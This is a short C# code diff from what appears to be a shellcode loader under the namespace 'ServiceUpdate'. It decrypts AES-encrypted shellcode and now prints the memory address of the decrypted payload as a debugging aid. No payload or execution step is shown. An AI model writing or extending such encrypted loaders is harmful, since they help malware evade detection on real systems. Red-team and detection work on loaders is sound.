@@ -75,7 +75,14 @@ namespace ServiceUpdate
             // CALL DECRYPTION FUNCTION
             byte[] service = AES_Decrypt(aesshellcode, passwordBytes, salt);
 
-            Console.WriteLine("Shellcode has been decrypted");
+                        unsafe
+            {
+                fixed (byte* ptr = service)
+                {
+                    Console.WriteLine(String.Format("{0,-20} : 0x{1}", "decrypted shellcode is stored at:", ((IntPtr)ptr).ToString("x")));
+                }
+            }
+
             Console.WriteLine("Hit enter to continue!");
             Console.ReadLine();
 
